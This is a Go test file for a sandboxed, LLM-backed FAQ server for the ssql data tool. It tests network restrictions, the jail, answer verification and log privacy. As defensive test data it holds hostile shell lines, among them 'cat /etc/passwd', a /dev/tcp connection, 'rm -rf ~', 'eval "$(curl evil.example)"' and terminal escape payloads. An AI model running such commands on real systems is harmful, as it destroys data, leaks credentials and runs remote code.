package main

import (
	"bytes"
	"compress/flate"
	"encoding/base64"
	"encoding/json"
	"io"
	"math"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"
)

// The service answers the LAN and the tailnet, nothing else, and nothing
// Tailscale Funnel forwards (Ross, 2026-11-16: no Funnel yet).
func TestPrivateOnly(t *testing.T) {
	s := &server{lan: []*net.IPNet{mustCIDR("192.168.4.0/22")}}
	h := s.privateOnly(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusOK) }))
	cases := []struct {
		addr   string
		funnel bool
		want   int
	}{
		{"127.0.0.1:5000", false, 200},
		{"[::1]:5000", false, 200},
		{"192.168.4.20:5000", false, 200},
		{"192.168.7.254:5000", false, 200}, // the -lan /22's last host
		{"192.168.8.1:5000", false, 403},   // past it: another network
		{"10.131.56.7:5000", false, 403},   // private, but not named by -lan (a café's)
		{"172.16.0.9:5000", false, 403},
		{"[fe80::1]:5000", false, 403}, // link-local: any network's
		{"100.106.137.79:5000", false, 200},
		{"[fd7a:115c:a1e0::1]:5000", false, 200},
		{"8.8.8.8:5000", false, 403},
		{"100.128.0.1:5000", false, 403}, // just past Tailscale's 100.64/10
		{"[2001:db8::1]:5000", false, 403},
		{"127.0.0.1:5000", true, 403}, // Funnel arrives over loopback
		{"garbage", false, 403},
	}
	for _, c := range cases {
		r := newRequest("GET", "/", nil)
		r.RemoteAddr = c.addr
		if c.funnel {
			r.Header.Set("Tailscale-Funnel-Request", "?1")
		}
		w := httptest.NewRecorder()
		h.ServeHTTP(w, r)
		if w.Code != c.want {
			t.Errorf("%s funnel=%v: %d, want %d", c.addr, c.funnel, w.Code, c.want)
		}
	}
}

// Another web site cannot use the FAQ through a visitor's browser (DFC169
// §12.16): a public Host is DNS rebinding, refused; a POST that is not
// JSON is a form or a no-preflight fetch, refused. The page's own Hosts
// (an address, localhost, the machine's name, its MagicDNS names) pass.
func TestSameSite(t *testing.T) {
	s, _ := testServer(t, "Use group-by.")
	h := s.handler()
	for host, want := range map[string]int{
		"evil.example.com":             http.StatusMisdirectedRequest,
		"evil.example.com:8484":        http.StatusMisdirectedRequest,
		"192.168.4.132.nip.io:8484":    http.StatusMisdirectedRequest, // an address inside a public name
		"":                             http.StatusMisdirectedRequest,
		"192.168.4.132:8484":           200,
		"[fd7a:115c:a1e0::1]:8484":     200,
		"localhost:8484":               200,
		"derra":                        200,
		"derra.tail3f2e6c.ts.net:8443": 200,
		"DERRA.local.":                 200,
	} {
		r := newRequest("GET", "/", nil)
		r.RemoteAddr, r.Host = "192.168.4.20:5555", host
		w := httptest.NewRecorder()
		h.ServeHTTP(w, r)
		if w.Code != want {
			t.Errorf("Host %q: %d, want %d", host, w.Code, want)
		}
	}
	for ct, want := range map[string]int{
		"":                                  http.StatusUnsupportedMediaType,
		"text/plain":                        http.StatusUnsupportedMediaType,
		"application/x-www-form-urlencoded": http.StatusUnsupportedMediaType,
		"multipart/form-data; boundary=x":   http.StatusUnsupportedMediaType,
		"application/json; charset=utf-8":   200,
	} {
		for _, path := range []string{"/api/ask", "/api/vote"} {
			r := newRequest("POST", path, strings.NewReader(`{"question":"hi"}`))
			r.RemoteAddr = "192.168.4.20:5555"
			r.Header.Set("Content-Type", ct)
			w := httptest.NewRecorder()
			h.ServeHTTP(w, r)
			if path == "/api/vote" && want == 200 {
				want = http.StatusBadRequest // past sameSite: a vote needs up or down
			}
			if w.Code != want {
				t.Errorf("POST %s as %q: %d, want %d", path, ct, w.Code, want)
			}
		}
	}
}

// The jail is the second wall: a run sees its scratch directory and /usr,
// no network, no home, no /etc, and cannot write outside /work.
func TestJailConfines(t *testing.T) {
	if missing := jailAvailable(); missing != "" {
		t.Skipf("no %s", missing)
	}
	data := t.TempDir()
	os.WriteFile(filepath.Join(data, "a.csv"), []byte("x\n1\n"), 0o644)
	box := sandbox{ssql: ssqlForTest(t), dataDir: data, timeout: 20 * time.Second, jail: true}
	if r := box.run("ssql from a.csv | ssql count"); r.err != nil || strings.TrimSpace(r.stdout) != "1" {
		t.Fatalf("a run in the jail: %v %q %s", r.err, r.stdout, r.stderr)
	}
	home, _ := os.UserHomeDir()
	for _, script := range []string{
		"cat /etc/passwd",
		"ls " + home,
		"exec 3<>/dev/tcp/1.1.1.1/80",
		"echo x > /usr/x",
		"echo x > /run/ssql/x",
	} {
		// Raw shell, past the validator: the jail alone must hold.
		if r := box.run(script); r.err == nil {
			t.Errorf("%q succeeded in the jail: %s", script, r.stdout)
		}
	}
	if r := box.run("echo ok > out.txt && cat out.txt"); r.err != nil {
		t.Errorf("writing the scratch directory: %v %s", r.err, r.stderr)
	}
}

// A long pipeline fits the jail's task limit: each ssql stage is a Go
// process, and with a thread per core (24 on derra) four stages could pass
// 64 tasks, failing with "pthread_create failed: Resource temporarily
// unavailable" now and then (found 2026-11-23 by TestAskGeneratedGo).
func TestJailFitsALongPipeline(t *testing.T) {
	if missing := jailAvailable(); missing != "" {
		t.Skipf("no %s", missing)
	}
	data := t.TempDir()
	os.WriteFile(filepath.Join(data, "a.csv"), []byte("x\n1\n"), 0o644)
	box := sandbox{ssql: ssqlForTest(t), dataDir: data, timeout: 20 * time.Second, jail: true}
	p := "ssql from a.csv" + strings.Repeat(" | ssql where -if x ge 0", 8) + " | ssql count"
	for i := range 5 {
		if r := box.run(p); r.err != nil || strings.TrimSpace(r.stdout) != "1" {
			t.Fatalf("run %d: %v %q %s", i+1, r.err, r.stdout, r.stderr)
		}
	}
}

// fakeOllama replies with the given turns in order, the last repeating,
// and keeps the messages of the latest call in lastCall.
var lastCall []message

func fakeOllama(t *testing.T, replies ...string) (ollama, *int) {
	var mu sync.Mutex
	n := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			Messages []message `json:"messages"`
		}
		json.NewDecoder(r.Body).Decode(&req)
		mu.Lock()
		lastCall = req.Messages
		reply := replies[min(n, len(replies)-1)]
		n++
		mu.Unlock()
		json.NewEncoder(w).Encode(map[string]any{"message": message{Role: "assistant", Content: reply}, "eval_count": 5})
	}))
	t.Cleanup(srv.Close)
	return ollama{host: srv.URL, model: "fake"}, &n
}

func ssqlForTest(t *testing.T) string {
	bin, err := exec.LookPath("ssql")
	if err != nil {
		t.Skip("no ssql on PATH")
	}
	return bin
}

func testServer(t *testing.T, replies ...string) (*server, string) {
	repo, err := repoRoot()
	if err != nil {
		t.Fatal(err)
	}
	box := sandbox{ssql: ssqlForTest(t), dataDir: filepath.Join(repo, "cmd", "ssql-playground", "data"), timeout: 20 * time.Second, jail: jailAvailable() == ""}
	install, err := installLines(repo)
	if err != nil {
		t.Fatal(err)
	}
	f := &faq{repo: repo, box: box, retries: 2, docsK: 0, system: "test", install: install}
	llm, _ := fakeOllama(t, replies...)
	logPath := filepath.Join(t.TempDir(), "q.jsonl")
	s := newServer(f, llm, logPath)
	s.tmp = t.TempDir()
	s.lan = []*net.IPNet{mustCIDR("192.168.4.0/22")}
	return s, logPath
}

// newRequest is a request as the page sends it: to a Host the server
// trusts, and a POST as JSON (sameSite refuses anything else).
func newRequest(method, target string, body io.Reader) *http.Request {
	r := httptest.NewRequest(method, target, body)
	r.Host = "derra:8484"
	if method == http.MethodPost {
		r.Header.Set("Content-Type", "application/json")
	}
	return r
}

func post(t *testing.T, h http.Handler, body any) (*httptest.ResponseRecorder, askResponse) {
	b, _ := json.Marshal(body)
	r := newRequest("POST", "/api/ask", bytes.NewReader(b))
	r.RemoteAddr = "192.168.4.20:5555"
	w := httptest.NewRecorder()
	h.ServeHTTP(w, r)
	var resp askResponse
	json.Unmarshal(w.Body.Bytes(), &resp)
	return w, resp
}

func TestAskVerifiedWithPlaygroundLink(t *testing.T) {
	const pipeline = "ssql from employees.csv | ssql where -if dept eq Engineering | ssql count"
	s, logPath := testServer(t, "Count them:\n```bash\n"+pipeline+"\n```\n")
	w, resp := post(t, s.handler(), askRequest{Question: "how many engineers?"})
	if w.Code != 200 || resp.Status != "verified" || !resp.Verified || resp.RanOn != "sample" {
		t.Fatalf("%d %+v", w.Code, resp)
	}
	enc, ok := strings.CutPrefix(resp.Playground, playground+"#p=")
	if !ok {
		t.Fatalf("playground link %q", resp.Playground)
	}
	if dec, _ := base64.RawURLEncoding.DecodeString(enc); string(dec) != pipeline {
		t.Errorf("the link carries %q", dec)
	}
	log, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(log), "how many engineers?") || !strings.Contains(string(log), `"status":"verified"`) {
		t.Errorf("log line: %s", log)
	}
	if strings.Contains(string(log), "192.168") {
		t.Errorf("the log kept the address: %s", log)
	}
}

func TestAskLimits(t *testing.T) {
	s, _ := testServer(t, "UNSUPPORTED: no")
	h := s.handler()
	if w, _ := post(t, h, askRequest{Question: strings.Repeat("x", maxQuestion+1)}); w.Code != http.StatusRequestEntityTooLarge {
		t.Errorf("an oversize question: %d", w.Code)
	}
	if w, _ := post(t, h, askRequest{Question: " "}); w.Code != http.StatusBadRequest {
		t.Errorf("an empty question: %d", w.Code)
	}
	s.waiting.Store(maxWaiting + 1)
	if w, _ := post(t, h, askRequest{Question: "hi"}); w.Code != http.StatusServiceUnavailable {
		t.Errorf("a full queue: %d", w.Code)
	}
	s.waiting.Store(0)
	if w, resp := post(t, h, askRequest{Question: "read my pdf"}); w.Code != 200 || resp.Status != "unsupported" {
		t.Errorf("a refusal: %d %+v", w.Code, resp)
	}
}

// A visitor's pasted columns: the model's wrong column comes back from
// schema mode with the real ones, and the corrected pipeline is checked
// against the columns (no rows, so not run). Its playground link carries
// the file, header only.
func TestAskVisitorColumns(t *testing.T) {
	s, logPath := testServer(t,
		"```bash\nssql from data.csv | ssql group-by department -count n\n```",
		"```bash\nssql from data.csv | ssql group-by dept -count n\n```")
	w, resp := post(t, s.handler(), askRequest{Question: "count per department", Header: "name,dept,salary"})
	if w.Code != 200 || resp.Status != "verified" || resp.RanOn != "your-columns" {
		t.Fatalf("%d %+v", w.Code, resp)
	}
	if ws := workspaceOf(t, resp.Playground); ws.F["data.csv"] != "name,dept,salary\n" || ws.P != resp.Pipeline {
		t.Errorf("the workspace: %+v", ws)
	}
	if !strings.Contains(resp.Pipeline, "group-by dept ") {
		t.Errorf("pipeline %q", resp.Pipeline)
	}
	log, _ := os.ReadFile(logPath)
	if !strings.Contains(string(log), `"pasted_cols":3`) || strings.Contains(string(log), "salary") {
		t.Errorf("the log must count the pasted columns, not keep them: %s", log)
	}
	// With rows, it runs on them.
	s2, _ := testServer(t, "```bash\nssql from data.csv | ssql where -if salary gt 10 | ssql count\n```")
	_, resp = post(t, s2.handler(), askRequest{Question: "how many earn over 10?", Header: "name,salary\nann,5\nbob,20\n"})
	if resp.RanOn != "your-rows" || strings.TrimSpace(resp.Output) != "1" {
		t.Errorf("%+v", resp)
	}
}

// A question with a terminal escape in it is refused before the model or
// the log sees it: review.sh prints the log to a terminal (DFC169 §12.16).
func TestAskRefusesControlCharacters(t *testing.T) {
	s, logPath := testServer(t, "Use group-by.")
	for _, q := range []string{"hi \x1b[2J there", "osc \x1b]52;c;eA==\x07", "c1 \u009b31m", "nul \x00"} {
		if w, _ := post(t, s.handler(), askRequest{Question: q}); w.Code != http.StatusBadRequest {
			t.Errorf("%q: %d", q, w.Code)
		}
	}
	if w, resp := post(t, s.handler(), askRequest{Question: "two\nlines\twith a tab"}); w.Code != 200 || resp.Status != "prose" {
		t.Errorf("newline and tab: %d %+v", w.Code, resp)
	}
	if log, _ := os.ReadFile(logPath); strings.Count(string(log), "\n") != 1 {
		t.Errorf("only the plain question is logged: %s", log)
	}
}

// A follow-up carries the earlier exchange to the model as turns.
func TestAskFollowUp(t *testing.T) {
	s, logPath := testServer(t, "Yes: `generate go` turns it into a program.")
	prev := &exchange{Question: "Can I turn a pipeline into a Go program?", Reply: "Yes, with ssql generate go."}
	w, resp := post(t, s.handler(), askRequest{Question: "how does it do the conversion?", Previous: prev})
	if w.Code != 200 || resp.Status != "prose" {
		t.Fatalf("%d %+v", w.Code, resp)
	}
	if len(lastCall) != 4 || lastCall[1].Content != prev.Question || lastCall[2].Role != "assistant" || lastCall[2].Content != prev.Reply ||
		!strings.Contains(lastCall[3].Content, "how does it do the conversion?") {
		t.Errorf("the model saw %+v", lastCall)
	}
	if log, _ := os.ReadFile(logPath); !strings.Contains(string(log), `"follow_up":true`) {
		t.Errorf("log: %s", log)
	}
	// An unusable earlier exchange is dropped, not fatal.
	if w, _ := post(t, s.handler(), askRequest{Question: "hi", Previous: &exchange{Question: "q"}}); w.Code != 200 || len(lastCall) != 2 {
		t.Errorf("%d, the model saw %d messages", w.Code, len(lastCall))
	}
}

// With columns pasted, an answer over a sample file still runs on the
// sample (the visitor's directory holds both), and gets its playground link.
func TestAskVisitorSampleAnswer(t *testing.T) {
	s, _ := testServer(t, "```bash\nssql from employees.csv | ssql count\n```")
	w, resp := post(t, s.handler(), askRequest{Question: "show me count on the samples", Header: "a,b"})
	if w.Code != 200 || resp.Status != "verified" || resp.RanOn != "sample" || resp.Playground == "" {
		t.Fatalf("%d %+v", w.Code, resp)
	}
	if !strings.Contains(lastCall[len(lastCall)-1].Content, "the columns are only context") {
		t.Errorf("the prompt must say the columns are context: %s", lastCall[len(lastCall)-1].Content)
	}
}

// Named sections (Ross, 2026-11-24): a paste split by `--- NAME` lines is
// several files. Two with rows are joined and run on; one with names only
// makes the answer checked, not run, since a join over it has no rows.
func TestAskVisitorFiles(t *testing.T) {
	join := "```bash\nssql from sales.csv | ssql join reps.csv -using rep | ssql group-by region -sum amount total | ssql sort region\n```"
	paste := "--- sales.csv\nid,rep,amount\n1,ann,5\n2,bob,7\n3,ann,1\n--- reps\nrep,region\nann,north\nbob,south\n"
	s, logPath := testServer(t, join)
	w, resp := post(t, s.handler(), askRequest{Question: "total per region", Header: paste})
	if w.Code != 200 || resp.Status != "verified" || resp.RanOn != "your-rows" {
		t.Fatalf("%d %+v", w.Code, resp)
	}
	// The playground link carries both files, as written, and the pipeline.
	ws := workspaceOf(t, resp.Playground)
	if len(ws.F) != 2 || ws.F["reps.csv"] != "rep,region\nann,north\nbob,south\n" || !strings.HasPrefix(ws.F["sales.csv"], "id,rep,amount\n1,ann,5\n") || ws.P != resp.Pipeline {
		t.Errorf("the workspace: %+v", ws)
	}
	if log, _ := os.ReadFile(logPath); strings.Contains(string(log), "#w=") || strings.Contains(string(log), "north") {
		t.Errorf("the log must not keep the visitor's data: %s", log)
	}
	if !strings.Contains(resp.Output, "north") || !strings.Contains(resp.Output, "6") || !strings.Contains(resp.Output, "7") {
		t.Errorf("output %q", resp.Output)
	}
	if p := lastCall[len(lastCall)-1].Content; !strings.Contains(p, "`sales.csv`, with the columns id, rep, amount (with 3 sample rows)") ||
		!strings.Contains(p, "`reps.csv`, with the columns rep, region") {
		t.Errorf("the prompt: %s", p)
	}
	if log, _ := os.ReadFile(logPath); !strings.Contains(string(log), `"pasted_files":2,"pasted_cols":5,"pasted_rows":5`) {
		t.Errorf("log: %s", log)
	}
	s2, _ := testServer(t, join)
	_, resp = post(t, s2.handler(), askRequest{Question: "total per region", Header: "--- sales.csv\nid,rep,amount\n1,ann,5\n--- reps.csv\nrep\nregion\n"})
	if resp.Status != "verified" || resp.RanOn != "your-columns" {
		t.Errorf("one file names only: %+v", resp)
	}
}

// workspaceOf decodes a #w= playground link the way the playground's
// workspaceFromHash does.
func workspaceOf(t *testing.T, link string) (ws struct {
	V int
	P string
	F map[string]string
}) {
	t.Helper()
	b64, ok := strings.CutPrefix(link, playground+"#w=")
	if !ok {
		t.Fatalf("not a workspace link: %q", link)
	}
	raw, err := base64.RawURLEncoding.DecodeString(b64)
	if err != nil {
		t.Fatal(err)
	}
	doc, err := io.ReadAll(flate.NewReader(bytes.NewReader(raw)))
	if err != nil {
		t.Fatal(err)
	}
	if err := json.Unmarshal(doc, &ws); err != nil || ws.V != 1 {
		t.Fatalf("%s: %v", doc, err)
	}
	return ws
}

// A pipeline over the samples only keeps the plain #p= link, even with
// files pasted; one reading a pasted file names only the files it reads.
func TestPlaygroundLink(t *testing.T) {
	v := &visitor{files: []visitorFile{{name: "data.csv", csv: []byte("a\n1\n")}, {name: "b.csv", csv: []byte("b\n")}}}
	if l := playgroundLink("ssql from employees.csv", v); !strings.HasPrefix(l, playground+"#p=") {
		t.Errorf("samples only: %s", l)
	}
	if l := playgroundLink("ssql from employees.csv", nil); !strings.HasPrefix(l, playground+"#p=") {
		t.Errorf("no visitor: %s", l)
	}
	if ws := workspaceOf(t, playgroundLink("ssql from data.csv | ssql count", v)); len(ws.F) != 1 || ws.F["data.csv"] != "a\n1\n" {
		t.Errorf("%+v", ws)
	}
}

func TestSplitSections(t *testing.T) {
	for in, want := range map[string]string{
		"a,b\n1,2":                     "data.csv=a,b\n1,2",
		"a,b\n--- x.csv\nc\n":          "data.csv=a,b|x.csv=c",
		"--- x\nc\n---- y.csv ----\nd": "x.csv=c|y.csv=d",
		"a,b\n---\n1,2":                "data.csv=a,b\n---\n1,2", // a bare rule is data
		"--- empty.csv\n--- x.csv\nc":  "empty.csv=|x.csv=c",
	} {
		names, bodies, err := splitSections(in)
		var got []string
		for i := range names {
			got = append(got, names[i]+"="+bodies[i])
		}
		if err != nil || strings.Join(got, "|") != want {
			t.Errorf("%q: %q %v", in, got, err)
		}
	}
	for in, want := range map[string]string{
		"--- ../x.csv\na":        "cannot name a file",
		"--- x.json\na":          "cannot name a file",
		"--- x\na\n--- x.csv\nb": "named twice",
		strings.Repeat("--- f\na\n", 1) + "--- a\nb\n--- b\nb\n--- c\nb\n--- d\nb\n--- e\nb\n--- g\nb\n--- h\nb\n--- i\nb": "files",
	} {
		if _, _, err := splitSections(in); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%q: want %q, got %v", in, want, err)
		}
	}
	// An empty section is refused by name when the visitor is built.
	if _, err := newVisitor(t.TempDir(), t.TempDir(), "--- empty.csv\n--- x.csv\nc"); err == nil || !strings.Contains(err.Error(), "empty.csv: nothing pasted") {
		t.Errorf("empty section: %v", err)
	}
	// A name inside a longer one is not read.
	v := &visitor{files: []visitorFile{{name: "data.csv"}}}
	if v.readBy("ssql from mydata.csv") || v.readBy("ssql from data.csv.bak") || !v.readBy("ssql from data.csv | ssql count") || !v.readBy("ssql join <(ssql from data.csv)") {
		t.Errorf("readBy boundaries")
	}
}

func TestParseVisitor(t *testing.T) {
	ok := map[string][]string{
		"a,b,c":                                {"a", "b", "c"},
		"a\tb":                                 {"a", "b"},
		"a\nb\n c \n":                          {"a", "b", "c"},
		"x,y\n1,2\n3,4":                        {"x", "y"},
		" a , b ":                              {"a", "b"},
		"\"q,1\",b\n1,2":                       {"q,1", "b"},
		"Total Sales Amount In USD,region,rep": {"Total Sales Amount In USD", "region", "rep"}, // three names: never a sentence
		"a long column name for sure,b\n1,2":   {"a long column name for sure", "b"},           // rows: data, not a question
	}
	for in, want := range ok {
		recs, err := parseVisitor(in)
		if err != nil || strings.Join(recs[0], "|") != strings.Join(want, "|") {
			t.Errorf("%q: %v %v", in, recs, err)
		}
	}
	for in, want := range map[string]string{
		"":                              "nothing",
		"a,a":                           "twice",
		"a,,b":                          "no name",
		"a,b\n1":                        "row 1",
		"How does it do the conversion": "looks like a question",
		"what about dates?":             "looks like a question",
		"id\nwhy is this so slow?":      "looks like a question",
		strings.Repeat("x", 21<<10):     "KB",
		"a,b\n" + strings.Repeat("1,2\n", maxRows+1): "rows",
	} {
		if _, err := parseVisitor(in); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%.20q: want %q, got %v", in, want, err)
		}
	}
}

// "Is there pipeline-aware field completion in bash?" is answered by a
// line for ~/.bashrc (2026-11-17: the validator refused `eval` through two
// corrections). The model's single-quoted form is corrected, since in single
// quotes $(...) never runs; the double-quoted one is verified by ssql
// printing the script and bash parsing it, and has no playground link.
func TestAskShellSetup(t *testing.T) {
	s, _ := testServer(t,
		"Yes:\n```bash\neval '$(ssql -field-keybinding)'      # add this to your ~/.bashrc\n```",
		"Yes:\n```bash\neval \"$(ssql -shell-init)\"   # add this to your ~/.bashrc\n```\nThen Ctrl-O completes field names.")
	w, resp := post(t, s.handler(), askRequest{Question: "In bash, is there a way of getting pipeline aware field completion"})
	if w.Code != 200 || resp.Status != "verified" || resp.RanOn != "setup" || resp.Playground != "" {
		t.Fatalf("%d %+v", w.Code, resp)
	}
	if fb := lastCall[len(lastCall)-1].Content; !strings.Contains(fb, "double quotes") {
		t.Errorf("the correction must name the quoting: %s", fb)
	}
	// A flag ssql does not have fails in ssql's words.
	s, _ = testServer(t, "```bash\neval \"$(ssql -bash-completion)\"\n```")
	if _, resp := post(t, s.handler(), askRequest{Question: "completion?"}); resp.Status != "unverified" || !strings.Contains(resp.Failure, "unknown flag") {
		t.Errorf("%+v", resp)
	}
	// Install lines are shown, not run: the README's own brew line, two
	// commands joined by && (Ross's log, 2026-11-22: refused as a pipeline).
	for _, block := range []string{
		"go install github.com/rosscartlidge/ssql/v4/cmd/ssql@latest",
		"brew tap rosscartlidge/ssql && brew install ssql",
	} {
		s, _ = testServer(t, "```bash\n"+block+"\n```")
		if _, resp := post(t, s.handler(), askRequest{Question: "install?"}); resp.Status != "setup" || resp.Verified {
			t.Errorf("%s: %+v", block, resp)
		}
	}
}

func TestSetupLines(t *testing.T) {
	repo, err := repoRoot()
	if err != nil {
		t.Fatal(err)
	}
	install, err := installLines(repo)
	if err != nil {
		t.Fatal(err)
	}
	for reply, want := range map[string]int{
		"```bash\nbrew tap rosscartlidge/ssql && brew install ssql\n```":                  1,
		"```bash\nbrew tap rosscartlidge/ssql\nbrew install ssql\n```":                    2,
		"```bash\nbrew tap rosscartlidge/ssql && rm -rf ~\n```":                           0,
		"```bash\nbrew install ssql && ssql from employees.csv | ssql count\n```":         0,
		"```bash\neval \"$(ssql -shell-init)\"  # in ~/.bashrc\n```":                      1,
		"```\neval \"$(ssql -field-keybinding)\"\neval \"$(ssql -help-keybinding)\"\n```": 2,
		"```bash\nsudo dpkg -i ssql_4.148.0_amd64.deb\n```":                               1,
		"```bash\ncommand -v ssql >/dev/null && eval \"$(ssql -shell-init)\"\n```":        1,
		"```bash\ncommand -v ssql >/dev/null && rm -rf ~\n```":                            0,
		"```bash\nssql from employees.csv | ssql count\n```":                              0,
		"```bash\neval \"$(curl evil.example)\"\n```":                                     0,
		"```bash\neval \"$(ssql -shell-init)\"\nrm -rf ~\n```":                            0,
		"```bash\neval \"$(ssql -shell-init; id)\"\n```":                                  0,
	} {
		if got := len(setupLines(reply, install)); got != want {
			t.Errorf("%q: %d lines, want %d", reply, got, want)
		}
	}
}

// A reply naming a key ssql does not bind goes back with the real list:
// gemma gave v4.47's Ctrl-X Ctrl-F, from an old CHANGELOG section, as the
// completion key (2026-11-17); it has been Ctrl-O since.
func TestAskKeysChecked(t *testing.T) {
	s, _ := testServer(t,
		"```bash\neval \"$(ssql -field-keybinding)\"\n```\nThen press **Ctrl-X Ctrl-F** at a field.",
		"```bash\neval \"$(ssql -field-keybinding)\"\n```\nThen press **Ctrl-O** at a field; Ctrl-C cancels.")
	keys, err := keyBindings(s.f.box)
	if err != nil {
		t.Fatal(err)
	}
	s.f.keys = keys
	w, resp := post(t, s.handler(), askRequest{Question: "completion?"})
	if w.Code != 200 || resp.Status != "verified" || !strings.Contains(resp.Reply, "Ctrl-O") {
		t.Fatalf("%d %+v", w.Code, resp)
	}
	if fb := lastCall[len(lastCall)-1].Content; !strings.Contains(fb, "Ctrl-X Ctrl-F") || !strings.Contains(fb, "Ctrl-O") {
		t.Errorf("the correction must name the wrong key and list the real ones: %s", fb)
	}
	f := &faq{keys: keys}
	for reply, want := range map[string]string{
		"press Ctrl-O, or Alt-g (vi: Ctrl-X g), or Ctrl-X Ctrl-E": "",
		"press Ctrl+O to complete":                                "",
		"Ctrl-O completes; Ctrl-c stops it":                       "",
		"press Ctrl-X Ctrl-F":                                     "Ctrl-X Ctrl-F",
		"press Alt-q, then Alt-q again":                           "Alt-q",
		"no keys at all":                                          "",
	} {
		got := strings.TrimPrefix(f.checkKeys(reply), keysProblem)
		if got != want {
			t.Errorf("%q: %q, want %q", reply, got, want)
		}
	}
}

// A signal answer runs on signal.csv, and gets its playground link (the
// playground has the file since 2026-11-24); the log keeps the answer's
// text.
func TestAskSignalSample(t *testing.T) {
	t.Setenv("XDG_CACHE_HOME", t.TempDir())
	repo, err := repoRoot()
	if err != nil {
		t.Fatal(err)
	}
	samples, err := buildSamples(repo)
	if err != nil {
		t.Fatal(err)
	}
	s, logPath := testServer(t, "The strongest frequencies:\n```bash\nssql from signal.csv | ssql fft -field amplitude -rate 100 | ssql top 3 -field magnitude\n```")
	s.f.box.dataDir = samples
	w, resp := post(t, s.handler(), askRequest{Question: "strongest frequencies?"})
	if w.Code != 200 || resp.Status != "verified" || resp.RanOn != "sample" || !strings.HasPrefix(resp.Playground, playground+"#p=") {
		t.Fatalf("%d %+v", w.Code, resp)
	}
	if log, _ := os.ReadFile(logPath); !strings.Contains(string(log), `"reply":"The strongest frequencies`) {
		t.Errorf("the log must keep the reply: %s", log)
	}
}

// The FAQ verifies on the files the playground loads, so a playground
// link opens on the data the answer ran on: the page's DATA_FILES is the
// data directory, and the playground's signal.csv is the codelab's.
func TestSamplesAreThePlaygrounds(t *testing.T) {
	repo, err := repoRoot()
	if err != nil {
		t.Fatal(err)
	}
	page, err := os.ReadFile(filepath.Join(repo, "cmd", "ssql-playground", "playground.html"))
	if err != nil {
		t.Fatal(err)
	}
	m := regexp.MustCompile(`const DATA_FILES = \[([^\]]*)\]`).FindSubmatch(page)
	if m == nil {
		t.Fatal("playground.html has no DATA_FILES")
	}
	var listed []string
	for _, q := range regexp.MustCompile(`'([^']+)'`).FindAllSubmatch(m[1], -1) {
		listed = append(listed, string(q[1]))
	}
	files, _ := filepath.Glob(filepath.Join(repo, samplesDir, "*"))
	var have []string
	for _, f := range files {
		have = append(have, filepath.Base(f))
	}
	slices.Sort(listed)
	if strings.Join(listed, " ") != strings.Join(have, " ") {
		t.Errorf("DATA_FILES %v, but %s holds %v", listed, samplesDir, have)
	}
	a, _ := os.ReadFile(filepath.Join(repo, samplesDir, "signal.csv"))
	b, _ := os.ReadFile(filepath.Join(repo, "doc", "codelab-data", "signal.csv"))
	if len(a) == 0 || string(a) != string(b) {
		t.Errorf("the playground's signal.csv differs from the codelab's")
	}
}

// The 100 Hz in sampleNotes is the data's own: t steps by 0.01 s.
func TestSampleNotesMatchTheData(t *testing.T) {
	repo, err := repoRoot()
	if err != nil {
		t.Fatal(err)
	}
	b, err := os.ReadFile(filepath.Join(repo, samplesDir, "signal.csv"))
	if err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(strings.TrimSpace(string(b)), "\n")
	var prev float64
	for i, ln := range lines[1:] {
		tv, err := strconv.ParseFloat(strings.Split(ln, ",")[0], 64)
		if err != nil {
			t.Fatal(err)
		}
		if i > 0 && math.Abs(tv-prev-0.01) > 1e-9 {
			t.Fatalf("row %d: t steps by %g, sampleNotes says 0.01", i+1, tv-prev)
		}
		prev = tv
	}
	if !strings.Contains(sampleNotes["signal.csv"], "100 Hz") {
		t.Errorf("note: %q", sampleNotes["signal.csv"])
	}
}

// The review turn: shown its output beside the question, the model may
// correct the shape, and the correction replaces the answer only when it
// runs; OK, or a correction that fails, keeps the first answer.
func TestAskReview(t *testing.T) {
	first := "```bash\nssql from employees.csv | ssql group-by dept -count n\n```"
	fixed := "```bash\nssql from employees.csv | ssql group-by dept -count n | ssql include n\n```"
	for _, c := range []struct {
		name, review, want string
		revised            bool
	}{
		{"corrected", fixed, "ssql include n", true},
		{"ok", "OK", "group-by dept -count n", false},
		{"broken correction", "```bash\nssql from employees.csv | ssql include nope\n```", "group-by dept -count n", false},
	} {
		s, logPath := testServer(t, first, c.review)
		s.f.review = true
		w, resp := post(t, s.handler(), askRequest{Question: "only the counts per department, please"})
		if w.Code != 200 || resp.Status != "verified" || !strings.Contains(resp.Pipeline, c.want) {
			t.Errorf("%s: %d %+v", c.name, w.Code, resp)
			continue
		}
		review := lastCall[len(lastCall)-1].Content
		if c.name == "ok" && (!strings.Contains(review, "only the counts per department") || !strings.Contains(review, "dept")) {
			t.Errorf("the review must show the question and the output: %s", review)
		}
		if log, _ := os.ReadFile(logPath); strings.Contains(string(log), `"revised":true`) != c.revised {
			t.Errorf("%s: log %s", c.name, log)
		}
	}
}

func TestShownProgram(t *testing.T) {
	for in, want := range map[string]string{
		`ssql generate go -run -pipeline 'ssql from employees.csv | ssql count'`:           `ssql generate go -pipeline 'ssql from employees.csv | ssql count'`,
		`ssql generate go -build ./hc -pipeline 'ssql from e.csv | ssql where -if a eq b'`: `ssql generate go -pipeline 'ssql from e.csv | ssql where -if a eq b'`,
		`ssql generate go -run -pipeline "ssql from e.csv | ssql update -set n it's"`:      `ssql generate go -pipeline 'ssql from e.csv | ssql update -set n it'\''s'`,
		`ssql from e.csv | ssql generate go -run`:                                          `ssql from e.csv | ssql generate go`,
		`ssql from e.csv | ssql generate go -r`:                                            `ssql from e.csv | ssql generate go`,
		`ssql generate go -b hc -pipeline 'ssql from e.csv | ssql count'`:                  `ssql generate go -pipeline 'ssql from e.csv | ssql count'`,
		`ssql generate rust -run -pipeline 'ssql from employees.csv | ssql count'`:         `ssql generate rust -pipeline 'ssql from employees.csv | ssql count'`,
		`ssql from e.csv | ssql generate rust -build ./hc`:                                 `ssql from e.csv | ssql generate rust`,
